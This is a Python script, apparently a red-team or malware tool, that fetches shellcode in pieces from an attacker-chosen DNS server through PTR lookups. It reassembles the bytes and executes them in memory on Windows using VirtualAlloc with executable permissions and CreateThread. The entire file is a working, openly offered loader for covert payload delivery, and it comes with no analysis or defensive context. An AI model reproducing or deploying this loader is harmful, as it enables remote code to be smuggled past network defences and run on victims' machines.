#coding:utf-8
import sys
import dns.resolver
import dns.reversename
import re
import psutil
import ctypes
from ctypes import *
import getopt

#   Time：2020/2/12
#   Author：f1ndme
#   Github_Add：

#命令
opts, args = getopt.getopt(sys.argv[1:], "ho:", ["help", "output="])
for o, a in opts:
    if o in ("-h", "--help"):
        print("Usage: python DNS.shellcode.py -o 192.168.1.1"+ "\n" + "About 33 seconds")
        sys.exit()
    if o in ("-o", "--output"):
        output = a

my_resolver = dns.resolver.Resolver()
my_resolver.nameservers = [output]
my_resolver.timeout = 3
my_resolver.lifetime = 3

## DNS解析数据回传
num = 1
codes  = []
for i in range(34):
    ip = "1.1.1." + str(i)
    if num == 2:
        num = num-1
    while num < 2:
        try:
            qname = dns.reversename.from_address(ip)
            answer = my_resolver.query(qname, 'PTR')
            for rr in answer:
                #print(rr)
                if rr is not None:
                    codes.append(rr)
                    num = num + 1
        except:
            print("DNS解析超时，正在重新解析...")


##shellcode格式整理
pattern = re.compile(r'\w+')
nums=0
shellcode = b""
for nums in range(34):
    res = codes[nums]
    #print(res)
    code = pattern.findall(str(res))
    codess = ''.join(code[0].split('0x'))
    codess = bytes.fromhex(codess)
    shellcode += codess

shellcode = bytearray(shellcode)
# 设置VirtualAlloc返回类型为ctypes.c_uint64
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
# 申请内存
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

# 放入shellcode
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    buf,
    ctypes.c_int(len(shellcode))
)
# 创建一个线程从shellcode防止位置首地址开始执行
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.c_uint64(ptr),
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0))
)
# 等待上面创建的线程运行完
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))
print("About 33 seconds")